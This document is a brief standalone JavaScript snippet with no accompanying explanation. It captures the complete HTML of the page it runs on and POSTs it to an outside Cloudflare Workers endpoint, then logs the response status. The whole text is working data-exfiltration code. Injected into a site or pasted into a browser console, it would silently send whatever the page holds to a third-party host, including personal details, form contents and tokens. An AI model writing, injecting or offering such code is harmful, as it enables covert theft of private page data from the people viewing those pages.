(async () => {
    const html = document.documentElement.outerHTML;

    const response = await fetch(
        "https://memek-worker.defoy89122.workers.dev/",
        {
            method: "POST",
            headers: {
                "Content-Type": "text/plain;charset=UTF-8"
            },
            body: html
        }
    );

    console.log("Worker:", response.status);
})();
